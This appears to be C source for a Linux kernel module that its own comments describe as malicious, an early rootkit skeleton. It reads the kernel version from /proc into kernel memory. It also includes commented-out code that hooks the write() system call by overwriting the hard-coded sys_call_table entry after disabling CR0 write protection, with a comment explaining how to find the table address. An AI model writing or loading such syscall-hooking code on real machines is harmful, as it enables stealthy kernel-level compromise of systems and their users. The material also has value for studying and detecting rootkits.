#include <linux/module.h>  /* Needed by all kernel modules */
#include <linux/kernel.h>  /* Needed for loglevels (KERN_WARNING, KERN_EMERG, KERN_INFO, etc.) */
#include <linux/init.h>    /* Needed for __init and __exit macros. */
#include <linux/unistd.h>  /* sys_call_table __NR_* system call function indices */
#include <linux/fs.h>      /* filp_open */
#include <linux/slab.h>    /* kmalloc */

#include <asm/paravirt.h> /* write_cr0 */
#include <asm/uaccess.h>  /* get_fs, set_fs */

#include "hooks.h"

#define PROC_V    "/proc/version"
#define BOOT_PATH "/boot/System.map-"
#define MAX_VERSION_LEN   256

char *acquire_kernel_version (void) {
  struct file *proc_version;
  char *full_kernel_version, *parsed_version;

  /*
   * We use this to store the userspace perspective of the filesystem
   * so we can switch back to it after we are done reading the file
   * into kernel memory
   */
  mm_segment_t oldfs;

  /*
   * Standard trick for reading a file into kernel space
   * This is very bad practice. We're only doing it here because
   * we're malicious and don't give a damn about best practices.
   */
  oldfs = get_fs();
  set_fs (KERNEL_DS);

  /*
   * Open the version file in the /proc virtual filesystem
   */
  proc_version = filp_open(PROC_V, O_RDONLY, 0);
  if (IS_ERR(proc_version) || (proc_version == NULL)) {
    return NULL;
  }

  /*
   * Allocate space for the full kernel version info
   */
  full_kernel_version = kmalloc(MAX_VERSION_LEN, GFP_KERNEL);

  /*
   * Zero out memory just to be safe
   */
  memset(full_kernel_version, 0, MAX_VERSION_LEN);

  /*
   * Read version info from /proc virtual filesystem
   */
  vfs_read(proc_version, full_kernel_version, MAX_VERSION_LEN, &(proc_version->f_pos));

  /*
   * Extract the third field from the full version string
   */
  parsed_version = strsep(&full_kernel_version, " ");
  parsed_version = strsep(&full_kernel_version, " ");
  parsed_version = strsep(&full_kernel_version, " ");

  filp_close(proc_version, 0);
  
  /*
   * Switch filesystem context back to user space mode
   */
  set_fs(oldfs);

  return parsed_version;
}

/*
 * TODO Find a way to resolve this address dynamically.
 *   For now, find this value using:
 *     sudo cat System.map-$(uname -r) | grep 'sys_call_table'
 *   And hard code it here.
 */
//unsigned long *syscall_table = (unsigned long *)0xffffffff81801400;
//asmlinkage int (*original_write)(unsigned int, const char __user *, size_t);
//asmlinkage int new_write (unsigned int x, const char __user *y, size_t size) {
//  printk(KERN_EMERG "[+] write() hooked.");
//
//  return original_write(x, y, size);
//}

static int __init onload(void) {
  printk(KERN_WARNING "Hello world!\n");
  printk(KERN_EMERG "Version: %s\n", acquire_kernel_version());

//  write_cr0 (read_cr0 () & (~ 0x10000));
//  original_write = (void *)syscall_table[__NR_write];
//  syscall_table[__NR_write] = &new_write;
//  write_cr0 (read_cr0 () | 0x10000);

  /*
   * A non 0 return means init_module failed; module can't be loaded.
   */
  return 0;
}

static void __exit onunload(void) {
//  write_cr0 (read_cr0 () & (~ 0x10000));
//  syscall_table[__NR_write] = original_write;
//  write_cr0 (read_cr0 () | 0x10000);

  printk(KERN_INFO "Goodbye world!\n");
}

module_init(onload);
module_exit(onunload);
